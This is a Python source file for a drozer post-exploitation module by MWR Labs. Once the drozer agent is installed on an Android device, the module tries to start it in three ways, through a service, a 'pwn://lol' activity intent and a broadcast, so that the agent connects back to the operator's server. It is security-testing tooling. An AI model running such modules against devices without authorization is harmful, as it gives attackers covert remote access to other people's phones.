import os
from drozer.modules import common, Module

class StartInstalledAgent(Module, common.SuperUser, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Start installed drozer agent."
    description = "This is a helper module to start a drozer agent once it has been installed (somehow)."
    examples = ""
    author = ["Tyrone (@mwrlabs)"]
    date = "2013-12-12"
    license = "BSD (3 clause)"
    path = ["post", "perform"] 

    def execute(self, arguments):

        # Check if drozer is installed
        result = self.shellExec("pm list packages")
        if "com.mwr.dz" in result:
            print "[+] Found drozer agent"
        else:
            print "[-] drozer agent is not installed"
            return

        # Start drozer by attempting 3 different techniques
        print "[*] Attempting to kick start drozer agent - Method 1 (Service)"
        result = self.shellExec("am startservice -n com.mwr.dz/.Agent")
        if not ("ERROR" in result.upper() or "SECURITYEXCEPTION" in result.upper()):
            print "[+] Service started. You should have a connection on your server"
        else:
            print "[-] Failed"
            print "[*] Attempting to kick start drozer agent - Method 2 (Activity)"

            result = self.shellExec("am start pwn://lol")
            if not ("ERROR" in result.upper() or "SECURITYEXCEPTION" in result.upper()):
                print "[+] Activity opened. You should have a connection on your server"
            else:
                print "[-] Failed"
                print "[*] Attempting to kick start drozer agent - Method 3 (Broadcast)"
                result = self.shellExec("am broadcast -a com.mwr.dz.PWN")
                print "[*] No feedback available. You will have to look if you have a connection on your server"